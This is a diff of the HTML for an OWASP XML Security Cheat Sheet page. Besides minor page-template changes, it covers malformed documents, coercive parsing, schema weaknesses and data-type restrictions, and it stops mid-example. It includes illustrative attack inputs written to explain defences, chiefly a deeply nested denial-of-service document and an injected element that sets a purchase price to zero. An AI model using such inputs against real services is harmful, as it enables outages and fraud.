@@ -12,8 +12,14 @@
       
         <link rel="canonical" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html">
       
+      
+        <link rel="prev" href="XML_External_Entity_Prevention_Cheat_Sheet.html">
+      
+      
+        <link rel="next" href="XSS_Filter_Evasion_Cheat_Sheet.html">
+      
       <link rel="icon" href="../assets/WebSite_Favicon.png">
-      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.5.10">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.0">
     
     
       
@@ -21,11 +27,10 @@
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/main.975780f9.min.css">
+      <link rel="stylesheet" href="../assets/stylesheets/main.f79797b0.min.css">
       
         
         <link rel="stylesheet" href="../assets/stylesheets/palette.2505c338.min.css">
-        
       
       
 
@@ -112,8 +117,6 @@
       <form class="md-header__option" data-md-component="palette">
         
           
-          
-          
           <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
           
             <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
@@ -121,8 +124,6 @@
             </label>
           
         
-          
-          
           
           <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
           
@@ -2375,10 +2376,9 @@
                 
                   
 
-  <a href="https://github.com/OWASP/CheatSheetSeries/edit/master/docs/cheatsheets/XML_Security_Cheat_Sheet.md" title="Edit this page" class="md-content__button md-icon">
-    
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
-  </a>
+  
+  
+
 
 
 <h1 id="xml-security-cheat-sheet">XML Security Cheat Sheet<a class="headerlink" href="#xml-security-cheat-sheet" title="Permanent link">&para;</a></h1>
@@ -2400,7 +2400,7 @@
 <h4 id="malformed-document-to-malformed-document">Malformed Document to Malformed Document<a class="headerlink" href="#malformed-document-to-malformed-document" title="Permanent link">&para;</a></h4>
 <p>According to the XML specification, the string <code>--</code> (double-hyphen) must not occur within comments. Using the recovery mode of lxml and PHP, the following document will remain the same after being recovered:</p>
 <div class="highlight"><pre><span></span><code><span class="nt">&lt;element&gt;</span>
- <span class="cm">&lt;!-- one</span>
+<span class="w"> </span><span class="cm">&lt;!-- one</span>
 <span class="cm">  &lt;!-- another comment</span>
 <span class="cm"> comment --&gt;</span>
 <span class="nt">&lt;/element&gt;</span>
@@ -2408,21 +2408,21 @@
 <h4 id="well-formed-document-to-well-formed-document-normalized">Well-Formed Document to Well-Formed Document Normalized<a class="headerlink" href="#well-formed-document-to-well-formed-document-normalized" title="Permanent link">&para;</a></h4>
 <p>Certain parsers may consider normalizing the contents of your <code>CDATA</code> sections. This means that they will update the special characters contained in the <code>CDATA</code> section to contain the safe versions of these characters even though is not required:</p>
 <div class="highlight"><pre><span></span><code><span class="nt">&lt;element&gt;</span>
- <span class="cp">&lt;![CDATA[&lt;script&gt;a=1;&lt;/script&gt;]]&gt;</span>
+<span class="w"> </span><span class="cp">&lt;![CDATA[&lt;script&gt;a=1;&lt;/script&gt;]]&gt;</span>
 <span class="nt">&lt;/element&gt;</span>
 </code></pre></div>
 <p>Normalization of a <code>CDATA</code> section is not a common rule among parsers. Libxml could transform this document to its canonical version, but although well formed, its contents may be considered malformed depending on the situation:</p>
 <div class="highlight"><pre><span></span><code><span class="nt">&lt;element&gt;</span>
- <span class="ni">&amp;lt;</span>script<span class="ni">&amp;gt;</span>a=1;<span class="ni">&amp;lt;</span>/script<span class="ni">&amp;gt;</span>
+<span class="w"> </span><span class="ni">&amp;lt;</span>script<span class="ni">&amp;gt;</span>a=1;<span class="ni">&amp;lt;</span>/script<span class="ni">&amp;gt;</span>
 <span class="nt">&lt;/element&gt;</span>
 </code></pre></div>
 <h3 id="coercive-parsing">Coercive Parsing<a class="headerlink" href="#coercive-parsing" title="Permanent link">&para;</a></h3>
 <p>A coercive attack in XML involves parsing deeply nested XML documents without their corresponding ending tags. The idea is to make the victim use up -and eventually deplete- the machine's resources and cause a denial of service on the target. Reports of a DoS attack in Firefox 3.67 included the use of 30,000 open XML elements without their corresponding ending tags. Removing the closing tags simplified the attack since it requires only half of the size of a well-formed document to accomplish the same results. The number of tags being processed eventually caused a stack overflow. A simplified version of such a document would look like this:</p>
 <div class="highlight"><pre><span></span><code><span class="nt">&lt;A1&gt;</span>
- <span class="nt">&lt;A2&gt;</span>
-  <span class="nt">&lt;A3&gt;</span>
-   ...
-    <span class="nt">&lt;A30000&gt;</span>
+<span class="w"> </span><span class="nt">&lt;A2&gt;</span>
+<span class="w">  </span><span class="nt">&lt;A3&gt;</span>
+<span class="w">   </span>...
+<span class="w">    </span><span class="nt">&lt;A30000&gt;</span>
 </code></pre></div>
 <h3 id="violation-of-xml-specification-rules">Violation of XML Specification Rules<a class="headerlink" href="#violation-of-xml-specification-rules" title="Permanent link">&para;</a></h3>
 <p>Unexpected consequences may result from manipulating documents using parsers that do not follow W3C specifications. It may be possible to achieve crashes and/or code execution when the software does not properly verify how to handle incorrect XML structures. Feeding the software with fuzzed XML documents may expose this behavior.</p>
@@ -2432,14 +2432,14 @@
 <h3 id="document-without-schema">Document without Schema<a class="headerlink" href="#document-without-schema" title="Permanent link">&para;</a></h3>
 <p>Consider a bookseller that uses a web service through a web interface to make transactions. The XML document for transactions is composed of two elements: an <code>id</code> value related to an item and a certain <code>price</code>. The user may only introduce a certain <code>id</code> value using the web interface:</p>
 <div class="highlight"><pre><span></span><code><span class="nt">&lt;buy&gt;</span>
- <span class="nt">&lt;id&gt;</span>123<span class="nt">&lt;/id&gt;</span>
- <span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
+<span class="w"> </span><span class="nt">&lt;id&gt;</span>123<span class="nt">&lt;/id&gt;</span>
+<span class="w"> </span><span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
 <span class="nt">&lt;/buy&gt;</span>
 </code></pre></div>
 <p>If there is no control on the document's structure, the application could also process different well-formed messages with unintended consequences. The previous document could have contained additional tags to affect the behavior of the underlying application processing its contents:</p>
 <div class="highlight"><pre><span></span><code><span class="nt">&lt;buy&gt;</span>
- <span class="nt">&lt;id&gt;</span>123<span class="nt">&lt;/id&gt;&lt;price&gt;</span>0<span class="nt">&lt;/price&gt;&lt;id&gt;&lt;/id&gt;</span>
- <span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
+<span class="w"> </span><span class="nt">&lt;id&gt;</span>123<span class="nt">&lt;/id&gt;&lt;price&gt;</span>0<span class="nt">&lt;/price&gt;&lt;id&gt;&lt;/id&gt;</span>
+<span class="w"> </span><span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
 <span class="nt">&lt;/buy&gt;</span>
 </code></pre></div>
 <p>Notice again how the value 123 is supplied as an <code>id</code>, but now the document includes additional opening and closing tags. The attacker closed the <code>id</code> element and sets a bogus <code>price</code> element to the value 0. The final step to keep the structure well-formed is to add one empty <code>id</code> element. After this, the application adds the closing tag for <code>id</code> and set the <code>price</code> to 10. If the application processes only the first values provided for the ID and the value without performing any type of control on the structure, it could benefit the attacker by providing the ability to buy a book without actually paying for it.</p>
@@ -2447,12 +2447,12 @@
 <p>Certain schemas do not offer enough restrictions for the type of data that each element can receive. This is what normally happens when using <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>; it has a very limited set of possibilities compared to the type of restrictions that can be applied in XML documents. This could expose the application to undesired values within elements or attributes that would be easy to constrain when using other schema languages. In the following example, a person's <code>age</code> is validated against an inline <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> schema:</p>
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE person [</span>
 <span class="cp"> &lt;!ELEMENT person (name, age)&gt;</span>
- <span class="cp">&lt;!ELEMENT name (#PCDATA)&gt;</span>
- <span class="cp">&lt;!ELEMENT age (#PCDATA)&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ELEMENT name (#PCDATA)&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ELEMENT age (#PCDATA)&gt;</span>
 ]&gt;
 <span class="nt">&lt;person&gt;</span>
- <span class="nt">&lt;name&gt;</span>John Doe<span class="nt">&lt;/name&gt;</span>
- <span class="nt">&lt;age&gt;</span>11111..(1.000.000digits)..11111<span class="nt">&lt;/age&gt;</span>
+<span class="w"> </span><span class="nt">&lt;name&gt;</span>John<span class="w"> </span>Doe<span class="nt">&lt;/name&gt;</span>
+<span class="w"> </span><span class="nt">&lt;age&gt;</span>11111..(1.000.000digits)..11111<span class="nt">&lt;/age&gt;</span>
 <span class="nt">&lt;/person&gt;</span>
 </code></pre></div>
 <p>The previous document contains an inline <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> with a root element named <code>person</code>. This element contains two elements in a specific order: <code>name</code> and then <code>age</code>. The element <code>name</code> is then defined to contain <code>PCDATA</code> as well as the element <code>age</code>. After this definition begins the well-formed and valid XML document. The element name contains an irrelevant value but the <code>age</code> element contains one million digits. Since there are no restrictions on the maximum size for the <code>age</code> element, this one-million-digit string could be sent to the server for this element. Typically this type of element should be restricted to contain no more than a certain amount of characters and constrained to a certain set of characters (for example, digits from 0 to 9, the + sign and the - sign). If not properly restricted, applications may handle potentially invalid values contained in documents. Since it is not possible to indicate specific restrictions (a maximum length for the element <code>name</code> or a valid range for the element <code>age</code>), this type of schema increases the risk of affecting the integrity and availability of resources.</p>
@@ -2460,13 +2460,13 @@
 <p>When schemas are insecurely defined and do not provide strict rules, they may expose the application to diverse situations. The result of this could be the disclosure of internal errors or documents that hit the application's functionality with unexpected values.</p>
 <h4 id="string-data-types">String Data Types<a class="headerlink" href="#string-data-types" title="Permanent link">&para;</a></h4>
 <p>Provided you need to use a hexadecimal value, there is no point in defining this value as a string that will later be restricted to the specific 16 hexadecimal characters. To exemplify this scenario, when using XML encryption some values must be encoded using base64 . This is the schema definition of how these values should look:</p>
-<div class="highlight"><pre><span></span><code><span class="nt">&lt;element</span> <span class="na">name=</span><span class="s">&quot;CipherData&quot;</span> <span class="na">type=</span><span class="s">&quot;xenc:CipherDataType&quot;</span><span class="nt">/&gt;</span>
- <span class="nt">&lt;complexType</span> <span class="na">name=</span><span class="s">&quot;CipherDataType&quot;</span><span class="nt">&gt;</span>
-  <span class="nt">&lt;choice&gt;</span>
-   <span class="nt">&lt;element</span> <span class="na">name=</span><span class="s">&quot;CipherValue&quot;</span> <span class="na">type=</span><span class="s">&quot;base64Binary&quot;</span><span class="nt">/&gt;</span>
-   <span class="nt">&lt;element</span> <span class="na">ref=</span><span class="s">&quot;xenc:CipherReference&quot;</span><span class="nt">/&gt;</span>
-  <span class="nt">&lt;/choice&gt;</span>
- <span class="nt">&lt;/complexType&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;CipherData&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xenc:CipherDataType&quot;</span><span class="nt">/&gt;</span>
+<span class="w"> </span><span class="nt">&lt;complexType</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;CipherDataType&quot;</span><span class="nt">&gt;</span>
+<span class="w">  </span><span class="nt">&lt;choice&gt;</span>
+<span class="w">   </span><span class="nt">&lt;element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;CipherValue&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;base64Binary&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;element</span><span class="w"> </span><span class="na">ref=</span><span class="s">&quot;xenc:CipherReference&quot;</span><span class="nt">/&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/choice&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/complexType&gt;</span>
 </code></pre></div>
 <p>The previous schema defines the element <code>CipherValue</code> as a base64 data type. As an example, the IBM WebSphere DataPower SOA Appliance allowed any type of characters within this element after a valid base64 value, and will consider it valid. The first portion of this data is properly checked as a base64 value, but the remaining characters could be anything else (including other sub-elements of the <code>CipherData</code> element). Restrictions are partially set for the element, which means that the information is probably tested using an application instead of the proposed sample schema.</p>
 <h4 id="numeric-data-types">Numeric Data Types<a class="headerlink" href="#numeric-data-types" title="Permanent link">&para;</a></h4>
@@ -2481,46 +2481,46 @@
 </ul>
 <p>The following sample document defines an <code>id</code> for a product, a <code>price</code>, and a <code>quantity</code> value that is under the control of an attacker:</p>
 <div class="highlight"><pre><span></span><code><span class="nt">&lt;buy&gt;</span>
- <span class="nt">&lt;id&gt;</span>1<span class="nt">&lt;/id&gt;</span>
- <span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
- <span class="nt">&lt;quantity&gt;</span>1<span class="nt">&lt;/quantity&gt;</span>
+<span class="w"> </span><span class="nt">&lt;id&gt;</span>1<span class="nt">&lt;/id&gt;</span>
+<span class="w"> </span><span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
+<span class="w"> </span><span class="nt">&lt;quantity&gt;</span>1<span class="nt">&lt;/quantity&gt;</span>
 <span class="nt">&lt;/buy&gt;</span>
 </code></pre></div>
 <p>To avoid repeating old errors, an XML schema may be defined to prevent processing the incorrect structure in cases where an attacker wants to introduce additional elements:</p>
-<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:schema</span> <span class="na">xmlns:xs=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="nt">&gt;</span>
- <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;buy&quot;</span><span class="nt">&gt;</span>
-  <span class="nt">&lt;xs:complexType&gt;</span>
-   <span class="nt">&lt;xs:sequence&gt;</span>
-    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;id&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
-    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;price&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:decimal&quot;</span><span class="nt">/&gt;</span>
-    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;quantity&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
-   <span class="nt">&lt;/xs:sequence&gt;</span>
-  <span class="nt">&lt;/xs:complexType&gt;</span>
- <span class="nt">&lt;/xs:element&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:schema</span><span class="w"> </span><span class="na">xmlns:xs=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;buy&quot;</span><span class="nt">&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:complexType&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:sequence&gt;</span>
+<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;id&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
+<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;price&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:decimal&quot;</span><span class="nt">/&gt;</span>
+<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;quantity&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;/xs:sequence&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/xs:complexType&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:element&gt;</span>
 <span class="nt">&lt;/xs:schema&gt;</span>
 </code></pre></div>
 <p>Limiting that <code>quantity</code> to an integer data type will avoid any unexpected characters. Once the application receives the previous message, it may calculate the final price by doing <code>price*quantity</code>. However, since this data type may allow negative values, it might allow a negative result on the user's account if an attacker provides a negative number. What you probably want to see in here to avoid that logical vulnerability is positiveInteger instead of integer.</p>
 <h5 id="divide-by-zero">Divide by Zero<a class="headerlink" href="#divide-by-zero" title="Permanent link">&para;</a></h5>
 <p>Whenever using user controlled values as denominators in a division, developers should avoid allowing the number zero. In cases where the value zero is used for division in XSLT, the error <code>FOAR0001</code> will occur. Other applications may throw other exceptions and the program may crash. There are specific data types for XML schemas that specifically avoid using the zero value. For example, in cases where negative values and zero are not considered valid, the schema could specify the data type <code>positiveInteger</code> for the element.</p>
-<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;denominator&quot;</span><span class="nt">&gt;</span>
- <span class="nt">&lt;xs:simpleType&gt;</span>
-  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">&quot;xs:positiveInteger&quot;</span><span class="nt">/&gt;</span>
- <span class="nt">&lt;/xs:simpleType&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;denominator&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:positiveInteger&quot;</span><span class="nt">/&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
 <span class="nt">&lt;/xs:element&gt;</span>
 </code></pre></div>
 <p>The element <code>denominator</code> is now restricted to positive integers. This means that only values greater than zero will be considered valid. If you see any other type of restriction being used, you may trigger an error if the denominator is zero.</p>
 <h5 id="special-values-infinity-and-not-a-number-nan">Special Values: Infinity and Not a Number (NaN)<a class="headerlink" href="#special-values-infinity-and-not-a-number-nan" title="Permanent link">&para;</a></h5>
 <p>The data types <code>float</code> and <code>double</code> contain real numbers and some special values: <code>-Infinity</code> or <code>-INF</code>, <code>NaN</code>, and <code>+Infinity</code> or <code>INF</code>. These possibilities may be useful to express certain values, but they are sometimes misused. The problem is that they are commonly used to express only real numbers such as prices. This is a common error seen in other programming languages, not solely restricted to these technologies. Not considering the whole spectrum of possible values for a data type could make underlying applications fail. If the special values <code>Infinity</code> and <code>NaN</code> are not required and only real numbers are expected, the data type <code>decimal</code> is recommended:</p>
-<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:schema</span> <span class="na">xmlns:xs=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="nt">&gt;</span>
- <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;buy&quot;</span><span class="nt">&gt;</span>
-  <span class="nt">&lt;xs:complexType&gt;</span>
-   <span class="nt">&lt;xs:sequence&gt;</span>
-    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;id&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
-    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;price&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:decimal&quot;</span><span class="nt">/&gt;</span>
-    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;quantity&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:positiveInteger&quot;</span><span class="nt">/&gt;</span>
-   <span class="nt">&lt;/xs:sequence&gt;</span>
-  <span class="nt">&lt;/xs:complexType&gt;</span>
- <span class="nt">&lt;/xs:element&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:schema</span><span class="w"> </span><span class="na">xmlns:xs=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;buy&quot;</span><span class="nt">&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:complexType&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:sequence&gt;</span>
+<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;id&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
+<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;price&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:decimal&quot;</span><span class="nt">/&gt;</span>
+<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;quantity&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:positiveInteger&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;/xs:sequence&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/xs:complexType&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:element&gt;</span>
 <span class="nt">&lt;/xs:schema&gt;</span>
 </code></pre></div>
 <p>The price value will not trigger any errors when set at Infinity or NaN, because these values will not be valid. An attacker can exploit this issue if those values are allowed.</p>
@@ -2528,85 +2528,85 @@
 <p>After selecting the appropriate data type, developers may apply additional restrictions. Sometimes only a certain subset of values within a data type will be considered valid:</p>
 <h5 id="prefixed-values">Prefixed Values<a class="headerlink" href="#prefixed-values" title="Permanent link">&para;</a></h5>
 <p>Certain types of values should only be restricted to specific sets: traffic lights will have only three types of colors, only 12 months are available, and so on. It is possible that the schema has these restrictions in place for each element or attribute. This is the most perfect allow-list scenario for an application: only specific values will be accepted. Such a constraint is called <code>enumeration</code> in XML schema. The following example restricts the contents of the element month to 12 possible values:</p>
-<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;month&quot;</span><span class="nt">&gt;</span>
- <span class="nt">&lt;xs:simpleType&gt;</span>
-  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">&quot;xs:string&quot;</span><span class="nt">&gt;</span>
-   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;January&quot;</span><span class="nt">/&gt;</span>
-   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;February&quot;</span><span class="nt">/&gt;</span>
-   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;March&quot;</span><span class="nt">/&gt;</span>
-   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;April&quot;</span><span class="nt">/&gt;</span>
-   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;May&quot;</span><span class="nt">/&gt;</span>
-   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;June&quot;</span><span class="nt">/&gt;</span>
-   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;July&quot;</span><span class="nt">/&gt;</span>
-   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;August&quot;</span><span class="nt">/&gt;</span>
-   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;September&quot;</span><span class="nt">/&gt;</span>
-   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;October&quot;</span><span class="nt">/&gt;</span>
-   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;November&quot;</span><span class="nt">/&gt;</span>
-   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;December&quot;</span><span class="nt">/&gt;</span>
-  <span class="nt">&lt;/xs:restriction&gt;</span>
- <span class="nt">&lt;/xs:simpleType&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;month&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:string&quot;</span><span class="nt">&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;January&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;February&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;March&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;April&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;May&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;June&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;July&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;August&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;September&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;October&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;November&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;December&quot;</span><span class="nt">/&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/xs:restriction&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
 <span class="nt">&lt;/xs:element&gt;</span>
 </code></pre></div>
 <p>By limiting the month element's value to any of the previous values, the application will not be manipulating random strings.</p>
 <h5 id="ranges">Ranges<a class="headerlink" href="#ranges" title="Permanent link">&para;</a></h5>
 <p>Software applications, databases, and programming languages normally store information within specific ranges. Whenever using an element or an attribute in locations where certain specific sizes matter (to avoid overflows or underflows), it would be logical to check whether the data length is considered valid. The following schema could constrain a name using a minimum and a maximum length to avoid unusual scenarios:</p>
-<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;name&quot;</span><span class="nt">&gt;</span>
- <span class="nt">&lt;xs:simpleType&gt;</span>
-  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">&quot;xs:string&quot;</span><span class="nt">&gt;</span>
-   <span class="nt">&lt;xs:minLength</span> <span class="na">value=</span><span class="s">&quot;3&quot;</span><span class="nt">/&gt;</span>
-   <span class="nt">&lt;xs:maxLength</span> <span class="na">value=</span><span class="s">&quot;256&quot;</span><span class="nt">/&gt;</span>
-  <span class="nt">&lt;/xs:restriction&gt;</span>
- <span class="nt">&lt;/xs:simpleType&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;name&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:string&quot;</span><span class="nt">&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:minLength</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;3&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:maxLength</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;256&quot;</span><span class="nt">/&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/xs:restriction&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
 <span class="nt">&lt;/xs:element&gt;</span>
 </code></pre></div>
 <p>In cases where the possible values are restricted to a certain specific length (let's say 8), this value can be specified as follows to be valid:</p>
-<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;name&quot;</span><span class="nt">&gt;</span>
- <span class="nt">&lt;xs:simpleType&gt;</span>
-  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">&quot;xs:string&quot;</span><span class="nt">&gt;</span>
-   <span class="nt">&lt;xs:length</span> <span class="na">value=</span><span class="s">&quot;8&quot;</span><span class="nt">/&gt;</span>
-  <span class="nt">&lt;/xs:restriction&gt;</span>
- <span class="nt">&lt;/xs:simpleType&gt;</span>
